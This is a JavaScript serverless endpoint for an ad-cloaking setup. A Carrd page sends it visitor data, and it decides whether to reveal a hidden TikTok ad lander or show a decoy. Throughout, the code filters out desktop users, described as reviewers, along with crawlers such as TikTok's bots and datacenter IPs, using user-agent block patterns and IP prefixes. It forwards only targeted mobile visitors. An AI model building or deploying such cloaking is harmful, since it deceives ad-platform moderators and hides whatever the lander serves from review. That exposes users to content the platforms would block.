/**
 * /api/r — Front Cloaker Decision Endpoint
 * 
 * The Carrd page POSTs here with device type, campid, and carrd URL.
 * This endpoint decides: is this a real targeted human, or a bot/reviewer?
 * 
 * Pass → returns { url: "https://yourlander.com/page.html?campid=..." }
 * Fail → returns {} (empty object, Carrd shows decoy)
 * 
 * Decision logic:
 *   1. Must be a POST request
 *   2. Must have a campid (c param)
 *   3. Must be mobile device (d param = 'm')
 *   4. IP checks: reject known datacenter ranges, TikTok crawlers
 *   5. Campaign must be active in our system
 */

import { getCarrdPages, getStore, getCampaign } from './_lib/store.js';
import {
  LANDERS,
  PASSTHROUGH_PARAMS,
  SUBID_PARAM,
  extractSparkCode,
} from './_lib/links-config.js';

/**
 * Build the lander URL handed back to the Carrd page.
 *
 * Two things here are load-bearing:
 *
 * 1. The sub-ID goes out as `s1`, NOT `campid`. Every door-routed lander forwards
 *    its whole query string to sprktrax.org/api/link/<slug> and reads `s1` to do
 *    it (FC/index.html:287-294). The door itself accepts only s1/sub1 and 404s
 *    without one — it has never read `campid`. Sending `campid=` here produced a
 *    404 at the door for 100% of this traffic.
 *
 * 2. Params on the Carrd URL are carried over. The Carrd page receives the full
 *    ad query string, but only `c` was ever read out of it — so ttclid (TikTok's
 *    click id, which drives CAPI match quality) and s3 (the ad account) were
 *    dropped at this hop and could never reach the network.
 */
function buildLanderUrl(landerUrl, campid, carrdUrl) {
  const url = new URL(landerUrl);
  url.searchParams.set(SUBID_PARAM, extractSparkCode(campid));

  let incoming;
  try {
    incoming = new URL(carrdUrl).searchParams;
  } catch {
    incoming = null; // Carrd href absent or malformed — the sub-ID alone still works
  }

  if (incoming) {
    for (const name of PASSTHROUGH_PARAMS) {
      const v = (incoming.get(name) || '').trim();
      if (v) url.searchParams.set(name, v);
    }
  }

  return url.toString();
}

// Known bot/datacenter indicators in user-agent or IP
const BOT_UA_PATTERNS = [
  /bot/i, /crawler/i, /spider/i, /scraper/i, /headless/i,
  /phantom/i, /selenium/i, /puppeteer/i, /playwright/i,
  /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i,
  /facebookexternalhit/i, /twitterbot/i, /linkedinbot/i,
  /bytespider/i, /tiktokbot/i, /petalbot/i,
  /ahrefsbot/i, /semrushbot/i, /mj12bot/i,
  /python-requests/i, /curl/i, /wget/i, /httpie/i,
  /go-http-client/i, /java\//i, /okhttp/i
];

// Known datacenter/cloud IP prefixes (simplified — expand as needed)
const DATACENTER_PREFIXES = [
  '34.', '35.', // Google Cloud
  '52.', '54.', '18.', '3.', // AWS
  '40.', '20.', '13.', // Azure
  '104.16', '104.17', '104.18', '104.19', '104.20', '104.21', '104.22', '104.23', '104.24', '104.25', // Cloudflare
  '172.67.', // Cloudflare
  '141.101.', // Cloudflare
  '162.158.', // Cloudflare
];

function isBot(userAgent) {
  if (!userAgent) return true;
  return BOT_UA_PATTERNS.some(p => p.test(userAgent));
}

function isDatacenterIP(ip) {
  if (!ip) return false;
  return DATACENTER_PREFIXES.some(prefix => ip.startsWith(prefix));
}

function getClientIP(req) {
  return req.headers['x-real-ip'] ||
    req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
    req.headers['cf-connecting-ip'] ||
    '';
}

export default function handler(req, res) {
  // CORS headers for cross-origin Carrd requests
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
  res.setHeader('Pragma', 'no-cache');

  // Handle preflight
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  // Only accept POST
  if (req.method !== 'POST') {
    return res.status(200).json({});
  }

  const body = req.body || {};
  const device = (body.d || '').toLowerCase();
  const campid = body.c || '';
  const carrdUrl = body.h || '';
  const userAgent = req.headers['user-agent'] || '';
  const clientIP = getClientIP(req);

  // === DECISION LOGIC ===

  // 1. No campid → reject (bot/direct visit)
  if (!campid) {
    return res.status(200).json({});
  }

  // 2. Desktop → reject (reviewers use desktop)
  if (device === 'd' || device === 'desktop') {
    return res.status(200).json({});
  }

  // 3. Bot user-agent → reject
  if (isBot(userAgent)) {
    return res.status(200).json({});
  }

  // 4. Datacenter IP → reject (optional, can be toggled)
  // Uncomment below for stricter filtering:
  // if (isDatacenterIP(clientIP)) {
  //   return res.status(200).json({});
  // }

  // 5. Look up campaign or use a configured lander
  const store = getStore();
  const campaign = store.campaigns[campid];

  // Committed config is the baseline every lambda shares; the in-memory store is
  // a scratch overlay that only exists inside whichever instance the admin wrote
  // to. The store is seeded from LANDERS, so dedupe by url rather than weighting
  // the configured landers twice.
  const seen = new Set();
  const landers = [...LANDERS, ...store.landers].filter(l => {
    if (!l.url || seen.has(l.url)) return false;
    seen.add(l.url);
    return true;
  });

  const landerUrl = (campaign && campaign.lander_url)
    ? campaign.lander_url
    : (landers.length ? landers[Math.floor(Math.random() * landers.length)].url : '');

  if (!landerUrl) {
    // No landers configured → reject
    return res.status(200).json({});
  }

  // Track the Carrd page usage
  const carrdPage = store.carrd_pages.find(p => carrdUrl.includes(p.subdomain));
  if (carrdPage) carrdPage.uses++;

  return res.status(200).json({ url: buildLanderUrl(landerUrl, campid, carrdUrl) });
}
